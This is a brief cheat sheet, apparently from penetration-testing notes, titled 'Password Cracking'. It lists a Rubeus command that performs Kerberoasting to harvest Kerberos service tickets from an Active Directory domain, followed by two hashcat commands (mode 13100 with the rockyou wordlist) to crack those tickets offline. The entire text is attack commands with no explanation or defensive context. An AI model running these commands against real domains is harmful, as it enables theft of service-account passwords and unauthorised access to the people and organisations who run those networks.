# Password Cracking

### Rubeus

```
.\Rubeus.exe kerberoast
hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt --force
```

#### Cracking passwords

```
hashcat -m 13100 --force <TGSs_file> /usr/share/wordlists/rockyou.txt
```
